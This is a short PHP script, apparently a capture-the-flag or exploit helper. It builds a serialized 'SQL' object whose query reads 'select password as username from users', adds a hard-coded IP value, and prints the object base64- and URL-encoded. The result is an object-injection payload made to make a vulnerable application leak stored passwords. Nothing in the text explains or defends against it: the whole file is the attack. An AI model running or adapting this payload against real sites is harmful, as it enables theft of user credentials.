<?php
	class SQL {
		public $query = 'select password as username from users';
		public $ip = array("ip"=>"113.170.37.235");
	}
	$sql = new SQL;
	echo urlencode(base64_encode(serialize($sql)));
?>
